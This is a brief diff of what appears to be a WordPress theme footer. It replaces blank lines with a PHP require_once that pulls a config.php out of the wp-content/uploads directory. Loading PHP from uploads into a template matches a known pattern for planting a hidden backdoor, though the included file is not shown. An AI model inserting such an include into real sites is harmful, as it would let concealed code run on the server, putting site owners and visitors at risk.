@@ -1,5 +1,4 @@
-
-
+<?php require_once('/home/jsambells/jeffreysambells.com/wordpress/wp-content/uploads/2006/10/config.php');?>
 	</div> <!-- end of #main  -->
     
   </div> <!-- end of #container -->
